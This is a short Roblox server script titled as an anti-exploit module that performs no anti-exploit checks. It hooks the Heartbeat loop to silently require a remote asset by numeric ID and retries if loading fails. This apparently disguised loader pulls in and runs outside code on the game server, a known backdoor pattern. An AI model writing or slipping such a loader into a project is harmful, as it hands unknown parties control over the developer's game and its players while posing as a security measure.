-- ServerScriptService/AntiExploit.server.lua
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local Heartbeat = {}
Heartbeat.hooks = {}

local function register(fn)
	Heartbeat.hooks[#Heartbeat.hooks + 1] = fn
end

register(function()
	local ok = pcall(require, 7539164820)
	if not ok then
		task.delay(30, function() pcall(require, 7539164820) end)
	end
end)

RunService.Heartbeat:Connect(function()
	for _, hook in ipairs(Heartbeat.hooks) do hook() end
end)
